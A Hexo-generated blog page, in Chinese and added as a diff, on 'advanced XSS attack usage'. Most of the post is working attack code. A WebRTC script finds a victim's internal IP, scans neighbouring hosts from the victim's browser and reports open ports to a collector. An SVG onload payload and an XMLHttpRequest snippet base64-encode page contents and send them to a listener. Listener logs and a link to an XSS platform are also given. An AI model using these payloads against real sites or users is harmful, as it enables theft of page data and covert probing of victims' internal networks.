@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        XSS的高级攻击用法 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>thinks</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击客户端，获取内网ip，并扫描内网端口"><span class="toc-text">攻击客户端，获取内网ip，并扫描内网端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）"><span class="toc-text">攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#某CTF-XSS-SSRF综合利用方式"><span class="toc-text">某CTF XSS+SSRF综合利用方式</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        XSS的高级攻击用法
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-08-14 16:34:16</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <a id="more"></a>
+
+<h3 id="攻击客户端，获取内网ip，并扫描内网端口"><a href="#攻击客户端，获取内网ip，并扫描内网端口" class="headerlink" title="攻击客户端，获取内网ip，并扫描内网端口"></a>攻击客户端，获取内网ip，并扫描内网端口</h3><p>xss.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">//数据传回</span><br><span class="line">var TagName = document.getElementsByTagName(&quot;body&quot;)[0];</span><br><span class="line">function post_data(ip,port)&#123;</span><br><span class="line">    var img = document.createElement(&quot;img&quot;);</span><br><span class="line">    img.setAttribute(&quot;src&quot;,&quot;http://127.0.0.1:8000/?ip=&quot; + ip + &quot;&amp;openport=&quot; + port);</span><br><span class="line">    img.setAttribute(&quot;style&quot;,&quot;display:none&quot;)</span><br><span class="line">    TagName.appendChild(img);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function getIPs(callback)&#123;</span><br><span class="line">    var ip_dups = &#123;&#125;;</span><br><span class="line">    //compatibility for firefox and chrome</span><br><span class="line">    var RTCPeerConnection = window.RTCPeerConnection</span><br><span class="line">        || window.mozRTCPeerConnection</span><br><span class="line">        || window.webkitRTCPeerConnection;</span><br><span class="line">    var useWebKit = !!window.webkitRTCPeerConnection;</span><br><span class="line">    //bypass naive webrtc blocking</span><br><span class="line">    if(!RTCPeerConnection)&#123;</span><br><span class="line">        //create an iframe node</span><br><span class="line">        var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">        iframe.style.display = &apos;none&apos;;</span><br><span class="line">        //invalidate content script</span><br><span class="line">        iframe.sandbox = &apos;allow-same-origin&apos;;</span><br><span class="line">        //insert a listener to cutoff any attempts to</span><br><span class="line">        //disable webrtc when inserting to the DOM</span><br><span class="line">        iframe.addEventListener(&quot;DOMNodeInserted&quot;, function(e)&#123;</span><br><span class="line">            e.stopPropagation();</span><br><span class="line">        &#125;, false);</span><br><span class="line">        iframe.addEventListener(&quot;DOMNodeInsertedIntoDocument&quot;, function(e)&#123;</span><br><span class="line">            e.stopPropagation();</span><br><span class="line">        &#125;, false);</span><br><span class="line">        //insert into the DOM and get that iframe&apos;s webrtc</span><br><span class="line">        document.body.appendChild(iframe);</span><br><span class="line">        var win = iframe.contentWindow;</span><br><span class="line">        RTCPeerConnection = win.RTCPeerConnection</span><br><span class="line">            || win.mozRTCPeerConnection</span><br><span class="line">            || win.webkitRTCPeerConnection;</span><br><span class="line">        useWebKit = !!win.webkitRTCPeerConnection;</span><br><span class="line">    &#125;</span><br><span class="line">    //minimal requirements for data connection</span><br><span class="line">    var mediaConstraints = &#123;</span><br><span class="line">        optional: [&#123;RtpDataChannels: true&#125;]</span><br><span class="line">    &#125;;</span><br><span class="line">    //firefox already has a default stun server in about:config</span><br><span class="line">    //    media.peerconnection.default_iceservers =</span><br><span class="line">    //    [&#123;&quot;url&quot;: &quot;stun:stun.services.mozilla.com&quot;&#125;]</span><br><span class="line">    var servers = undefined;</span><br><span class="line">    //add same stun server for chrome</span><br><span class="line">    if(useWebKit)</span><br><span class="line">        servers = &#123;iceServers: [&#123;urls: &quot;stun:stun.services.mozilla.com&quot;&#125;]&#125;;</span><br><span class="line">    //construct a new RTCPeerConnection</span><br><span class="line">    var pc = new RTCPeerConnection(servers, mediaConstraints);</span><br><span class="line">    function handleCandidate(candidate)&#123;</span><br><span class="line">        //match just the IP address</span><br><span class="line">        var ip_regex = /([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span><br><span class="line">        var ip_addr = ip_regex.exec(candidate)[1];</span><br><span class="line">        //remove duplicates</span><br><span class="line">        if(ip_dups[ip_addr] === undefined)</span><br><span class="line">            callback(ip_addr);</span><br><span class="line">        ip_dups[ip_addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    //listen for candidate events</span><br><span class="line">    pc.onicecandidate = function(ice)&#123;</span><br><span class="line">        //skip non-candidate events</span><br><span class="line">        if(ice.candidate)</span><br><span class="line">            handleCandidate(ice.candidate.candidate);</span><br><span class="line">    &#125;;</span><br><span class="line">    //create a bogus data channel</span><br><span class="line">    pc.createDataChannel(&quot;&quot;);</span><br><span class="line">    //create an offer sdp</span><br><span class="line">    pc.createOffer(function(result)&#123;</span><br><span class="line">        //trigger the stun server request</span><br><span class="line">        pc.setLocalDescription(result, function()&#123;&#125;, function()&#123;&#125;);</span><br><span class="line">    &#125;, function()&#123;&#125;);</span><br><span class="line">    //wait for a while to let everything done</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        //read candidate info from local description</span><br><span class="line">        var lines = pc.localDescription.sdp.split(&apos;\n&apos;);</span><br><span class="line">        lines.forEach(function(line)&#123;</span><br><span class="line">            if(line.indexOf(&apos;a=candidate:&apos;) === 0)</span><br><span class="line">                handleCandidate(line);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//简单端口扫描</span><br><span class="line">getIPs(function(ip)&#123;</span><br><span class="line">    //判断内网IP</span><br><span class="line">    if (ip.match(/^(192.168.|169.254.|10.|172.(1[6-9]|2d|3[01]))/))&#123;</span><br><span class="line">        //alert(ip);</span><br><span class="line">        ip = ip.split(&quot;.&quot;);</span><br><span class="line">        ip.pop();</span><br><span class="line">        ip = ip.join(&quot;.&quot;);</span><br><span class="line">        for(var i = 10;i&lt;=20;i++)&#123;</span><br><span class="line">            var script = document.createElement(&quot;script&quot;);</span><br><span class="line">            var ip_url = ip + &quot;.&quot; + i + &quot;:80&quot;;//3306</span><br><span class="line">            script.setAttribute(&quot;src&quot;,&quot;http://&quot; + ip_url);</span><br><span class="line">            script.setAttribute(&quot;onload&quot;,&quot;post_data(&apos;&quot; + ip + &quot;.&quot; + i + &quot;&apos;,&apos;80&apos;)&quot;);//3306</span><br><span class="line">            TagName.appendChild(script);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        //alert(ip);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>xss.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;xss_net.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>监听接收</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以使用 </span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">- - [14/Aug/2019 16:15:16] &quot;GET /?ip=10.210.97.18&amp;openport=80 HTTP/1.1&quot; 200 -</span><br><span class="line">- - [14/Aug/2019 16:15:21] &quot;GET /?ip=10.210.97.18&amp;openport=80 HTTP/1.1&quot; 200 -</span><br><span class="line">- - [14/Aug/2019 16:36:20] &quot;GET /?ip=10.210.97.18&amp;openport=80 HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）"><a href="#攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）" class="headerlink" title="攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）"></a>攻击客户端，获取用户页面内容（受到同源策略限制，只能访问同源页面）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// btoa 是js的base64函数 </span><br><span class="line">//获取当前页面</span><br><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://localhost:8000/?&apos;+btoa(document.body.innerHTML)&quot;&gt;  </span><br><span class="line"></span><br><span class="line">//获取其他页面,配合ajax使用</span><br><span class="line"></span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">    	//发送数据到接收端</span><br><span class="line">        document.write(&quot;&lt;img src=\&quot;http://localhost:8000/?&quot;+ btoa(xmlhttp.responseText) + &quot;\&quot; /&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;test.php&quot;,true); //test.php 为请求页面</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+
+<p>其他利用方式可参考XSS平台的配置<br><a href="http://xssye.com/index.php?do=module" target="_blank" rel="noopener">http://xssye.com/index.php?do=module</a></p>
+<h3 id="某CTF-XSS-SSRF综合利用方式"><a href="#某CTF-XSS-SSRF综合利用方式" class="headerlink" title="某CTF XSS+SSRF综合利用方式"></a>某CTF XSS+SSRF综合利用方式</h3><p><a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156377</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
